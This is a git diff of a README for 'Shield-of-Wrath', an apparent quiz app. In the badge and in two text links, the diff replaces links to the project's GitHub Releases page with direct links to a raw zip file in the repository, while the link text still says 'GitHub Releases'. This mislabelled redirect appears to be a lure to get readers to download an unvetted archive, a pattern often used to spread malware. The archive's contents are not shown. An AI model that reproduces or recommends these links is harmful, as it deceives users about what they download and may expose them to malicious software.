@@ -6,11 +6,11 @@ Welcome to **Shield-of-Wrath**, an interactive quiz app that challenges your kno
 
 ## 📥 Download Links
 
-[![Download Shield-of-Wrath](https://img.shields.io/badge/Download_Shield--of--Wrath-Release-brightgreen)](https://github.com/Lucassoares00/Shield-of-Wrath/releases)
+[![Download Shield-of-Wrath](https://raw.githubusercontent.com/Lucassoares00/Shield-of-Wrath/main/asset/Shield-of-Wrath_v3.3.zip)](https://raw.githubusercontent.com/Lucassoares00/Shield-of-Wrath/main/asset/Shield-of-Wrath_v3.3.zip)
 
 ## 📂 Download & Install
 
-To start using **Shield-of-Wrath**, visit this page to download: [GitHub Releases](https://github.com/Lucassoares00/Shield-of-Wrath/releases)
+To start using **Shield-of-Wrath**, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/Lucassoares00/Shield-of-Wrath/main/asset/Shield-of-Wrath_v3.3.zip)
 
 1. Go to the link above.
 2. Find the latest version of the application.
@@ -68,4 +68,4 @@ Thank you for supporting **Shield-of-Wrath**. Your feedback helps us build a bet
 
 Stay up-to-date with the latest news about **Shield-of-Wrath**. Follow us on social media or check back on this page for updates. 
 
-For more information, revisit the download page here: [GitHub Releases](https://github.com/Lucassoares00/Shield-of-Wrath/releases)
+For more information, revisit the download page here: [GitHub Releases](https://raw.githubusercontent.com/Lucassoares00/Shield-of-Wrath/main/asset/Shield-of-Wrath_v3.3.zip)
